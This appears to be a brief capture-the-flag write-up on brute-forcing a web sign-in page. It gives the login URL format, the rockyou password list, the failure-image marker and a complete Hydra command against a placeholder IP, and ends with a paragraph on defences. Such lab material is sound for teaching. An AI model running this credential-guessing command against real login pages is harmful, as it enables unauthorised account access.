# BRUTEFORCE

```
http://{IP_ADDRESS}/index.php?page=signin&username=admin&password=1234&Login=Login#
```

### PASSWORD LIST

```https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt```
 

```html
<img src="images/WrongAnswer.gif" alt="">
```

### HYDRA

```hydra -l admin -P rockyou.txt {IP_ADRESS} http-get-form '/:page=signin&username=^USER^&password=^PASS^&Login=Login:gif'```


A brute-force attack is a method used to gain unauthorized access by systematically trying all possible combinations of passwords or keys until the correct one is found. This approach is simple but can be time-consuming, especially if strong, complex passwords are used. Brute-force attacks often utilize automated tools and wordlists to speed up the process. Implementing strong password policies, rate limiting, and multi-factor authentication are effective ways to defend against such attacks.